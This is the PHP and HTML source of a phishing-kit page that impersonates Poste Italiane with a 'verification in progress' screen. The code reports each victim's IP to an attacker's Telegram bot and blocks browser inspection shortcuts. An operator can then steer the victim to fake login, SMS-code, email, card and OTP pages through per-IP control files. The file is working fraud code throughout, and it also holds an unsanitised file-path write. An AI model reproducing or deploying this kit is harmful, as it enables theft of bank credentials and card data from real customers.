<?php 
//////////
include_once '../../../BOTS/INC/APP.php';
include('../../../BOTS/STRNG.php');
include "DATE.php";
include "CHATID.TOKEN.php";
//////////
$ip = $_SERVER['REMOTE_ADDR'];
////////// Get the current file's name
$filename = basename(__FILE__);
////////// Determine the protocol (http or https)
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
////////// Determine the hostname
$host = $_SERVER['HTTP_HOST'];
////////// Determine the base directory
$baseDirectory = dirname($_SERVER['SCRIPT_NAME']);
//////////
$current_time = date("H:i:s");
$current_date = date("d:m:y");
////////// Construct the base URL
$baseURL = $protocol . $host . $baseDirectory;
$newFilePath= $baseURL . "/index.php?ip=$ip&time=$current_time&date=$current_date";
//////////
 if($_SERVER['REQUEST_METHOD'] == "POST") {
  if ($_POST['step'] == "control") {
$current_time = $_POST['time'];
    $fp = fopen('IPS/'. $_POST['ip'] .'.txt', 'wb');
       
 
    fwrite($fp, $_POST['to']);
    fclose($fp);
    header("location: index.php?ip=" . $_POST['ip']."&buttonClicked=".$_POST['to']."&time=$current_time");
}}
else{
    $filename = 'IPS/' . $ip . '.txt';
    touch($filename);
//////////
$ATR480X .= "♛♛ 🎛 【 𝐏𝐎𝐒𝐓𝐄𝐏𝐀𝐘•𝐀𝐓𝐑𝟒𝟖𝟎𝐗 】 🎛 ♛♛\n";//Bold (serif)//
$ATR480X .= "【 🔎 】 :   【 $ip 】\n";
$ATR480X .= "═════ ★ 【 🔗 】\n";
$ATR480X .= "$newFilePath\n";
$ATR480X .= "═════ ★ 【 📆 】\n";
$ATR480X .= "$GET_DATE + $GET_DATE_FORM\n";
$ATR480X .= "•••••••••• 🇮🇹🇮🇹•【 DENMARK 】•🇮🇹🇮🇹🇰\n";
$ATR480X .= "【 ♛•🦅•▄︻テ══━一💥•🦅•♛ 】\n";
//////////
$botToken = $TGtoken;
$chatId = $TGchatid;
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$params = array(
"chat_id" => $chatId,
"text" => $ATR480X,
//////////
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
}
//////////
$LOGINX= "../LOGIN.X/index.php?client_id=$my_rand_strng";
$SMS= "../SMS/index.php?client_id=$my_rand_strng";
$SMSX= "../SMS.X/index.php?client_id=$my_rand_strng";
$EMAIL= "../EMAIL/index.php?client_id=$my_rand_strng";
$EMAILX= "../EMAIL.X/index.php?client_id=$my_rand_strng";
$CARD= "../CARD/index.php?client_id=$my_rand_strng";
$CARDX= "../CARD.X/index.php?client_id=$my_rand_strng";
$CODE= "../CODE/index.php?client_id=$my_rand_strng";
$CODEX= "../CODE.X/index.php?client_id=$my_rand_strng";
$NX= "../NEXI/indexx.php?client_id=$my_rand_strng";
$GRAZIE= "../GRAZIE/index.php?client_id=$my_rand_strng";
//////////




?>
<!DOCTYPE html>
<html>
<head>
    <title>Verifica in corso - Poste Italiane</title>
	<link type="image/x-icon" rel="shortcut icon" href="https://www.poste.it/favicon.ico"/>
<!------------------->
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	Poste Italiane - 
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<!DOCTYPE html>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
    <!-- استيراد ملفات التصميم الأساسية -->
    <link type="text/css" rel="stylesheet" href="./IDP_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./IDP_files/core.min.css">
    <link type="text/css" rel="stylesheet" href="./IDP_files/custom.css">

    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #f4f6f8;
            font-family: Arial, sans-serif;
            overflow: hidden; /* منع ظهور السكرول نهائياً */
            -webkit-text-size-adjust: 100%;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
            padding: 12px;
        }

        .loading-container {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            text-align: center;
        }

        /* شريط الشعار بخلفية صفراء ممتدة */
        .logo-header {
            background-color: #EEDC00; 
            padding: 18px 15px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
        }

        .logo-header img {
            max-height: 32px;
            width: auto;
            max-width: 100%;
            display: block;
        }

        .loading-body {
            padding: 30px 20px;
        }

        /* تصميم الدائرة المتحركة الاحترافية */
        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #f1f1f1;
            border-top: 4px solid #004638;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            font-size: 17px;
            color: #1a1a1a;
            margin-bottom: 10px;
            font-weight: 700;
            line-height: 1.35;
        }

        p {
            font-size: 13px;
            color: #666666;
            line-height: 1.4;
            margin: 0;
        }
    </style>
</head>
<body>

    <div class="loading-container">
        <!-- الشعار مع خلفية صفراء ممتدة -->
        <div class="logo-header">
            <img src="https://www.media.poste.it/03827cbe-81a9-4d31-be55-bab5c161f851/lg/webp/logo-poste-italianei@1x" alt="Poste Italiane">
        </div>
        
        <!-- المحتوى والرسائل المطلوبة -->
        <div class="loading-body">
            <div class="spinner"></div>
            <h2>Attendi mentre verifichiamo le tue informazioni...</h2>
            <p>Si prega di non chiudere questa finestra.</p>
        </div>
    </div>

</body>
</html>

<!------------------->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
<!--------->
        <script>
setTimeout(function() {
    window.location.href = '../LOGIN.X/';
}, 120000); // 3 minutes in milliseconds

            var ip = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
console.log("ATR480X");
            var waiting = setInterval(function() {
                $.get('./IPS/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                 
                        if( data == 'CARDX' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $CARDX?>";
                        } else if( data == 'LOGINX' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $LOGINX?>";
                        } else if( data == 'SMS' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $SMS?>";
                        } else if( data == 'SMSX' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $SMSX?>";
                        } else if( data == 'EMAIL' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $EMAIL?>";
                        } else if( data == 'EMAILX' ) {
                            clearInterval(waiting);
                           
                            location.href = "<?php echo $EMAILX?>";
						} else if( data == 'CARD' ) {
                            clearInterval(waiting);
							
							location.href = "<?php echo $CARD?>";
						} else if( data == 'CODE' ) {
                            clearInterval(waiting);
							
							location.href = "<?php echo $CODE?>";
						} else if( data == 'GRAZIE' ) {
                            clearInterval(waiting);
							
							location.href = "<?php echo $GRAZIE?>";
						} else if( data == 'NX' ) {
                            clearInterval(waiting);
							
							location.href = "<?php echo $NX?>";
                        }
                        
                    }
                });
            }, 800);
        </script>
<!--------->
</head>
<body>
</body>
</html>